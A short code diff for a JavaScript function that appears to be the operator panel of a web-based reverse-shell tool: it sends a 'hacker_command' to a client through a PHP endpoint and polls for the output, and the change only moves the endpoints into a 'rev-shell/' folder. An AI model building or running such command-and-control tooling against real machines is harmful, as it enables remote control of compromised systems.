@@ -1,8 +1,8 @@
 function request(hacker_command){
     var number = 0
-    $.post("send_command_to_client.php",{"command":hacker_command},function(data){
+    $.post("rev-shell/send_command_to_client.php",{"command":hacker_command},function(data){
         var timer = setInterval(function() {
-            $.get("check_to_recv_data.php", function(data) {
+            $.get("rev-shell/check_to_recv_data.php", function(data) {
                 if (data != "") {
                     obj = JSON.parse(data)
                     $("#result").text(obj.output)
